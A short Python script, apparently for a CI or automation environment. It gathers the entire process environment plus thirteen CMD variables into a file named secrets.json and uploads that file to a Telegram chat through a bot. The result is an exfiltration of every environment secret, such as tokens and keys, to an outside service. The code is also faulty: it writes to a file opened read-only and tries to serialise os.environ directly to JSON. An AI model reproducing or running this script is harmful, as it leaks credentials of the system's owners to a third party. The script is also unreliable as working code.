import requests

import json
import time
from telegram import Bot
import os


async def send_file_to_telegram():
    telegram_token = os.environ["bot_token"]  # 替换为你的Telegram bot token
    telegram_chat_id = os.environ["chat_id"]  # 替换为你的频道或群组ID
    bot = Bot(token=telegram_token)
    archive_path = os.path.join(".", f"secrets.json")
    await bot.send_document(chat_id=telegram_chat_id, document=open(archive_path, "rb"))


async def main():
    with open("secrets.json") as f:
        data = {}
        for code in range(1, 14, 1):
            data["environ"] = os.environ
            data[f"CMD_{code}"] = [os.environ[f"CMD_{code}"]]
        json.dump(data, f, indent=4)
    await send_file_to_telegram()


import asyncio

if __name__ == "__main__":
    asyncio.run(main())
